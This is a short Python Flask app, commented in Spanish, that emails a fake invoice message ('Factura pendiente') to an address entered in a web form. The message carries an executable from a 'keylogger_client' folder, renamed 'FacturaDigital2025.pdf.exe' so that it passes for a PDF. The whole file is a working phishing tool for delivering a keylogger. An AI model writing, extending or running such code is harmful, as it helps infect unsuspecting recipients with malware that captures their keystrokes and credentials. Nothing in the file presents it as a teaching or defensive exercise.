
from flask import Flask, render_template, request
import smtplib
import os
from email.message import EmailMessage

app = Flask(__name__)
FAKE_FILE_PATH = "keylogger_client/fake_document.exe"

# ⚠️ Reemplaza esto con tu propio correo y contraseña de aplicación
GMAIL_USER = "tucorreo@gmail.com"
GMAIL_PASS = "tu_contraseña_de_aplicación"

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/send", methods=["POST"])
def send():
    contact = request.form["contact"]
    subject = "Factura pendiente 📄"
    body = "Estimado cliente, adjuntamos el archivo solicitado.\nSaludos cordiales."

    msg = EmailMessage()
    msg["Subject"] = subject
    msg["From"] = GMAIL_USER
    msg["To"] = contact
    msg.set_content(body)

    with open(FAKE_FILE_PATH, "rb") as f:
        file_data = f.read()
        file_name = "FacturaDigital2025.pdf.exe"
        msg.add_attachment(file_data, maintype="application", subtype="octet-stream", filename=file_name)

    try:
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
            smtp.login(GMAIL_USER, GMAIL_PASS)
            smtp.send_message(msg)
        return render_template("index.html", message="✅ Archivo enviado exitosamente al contacto.")
    except Exception as e:
        return render_template("index.html", message=f"❌ Error al enviar: {e}")

if __name__ == "__main__":
    app.run(debug=True)
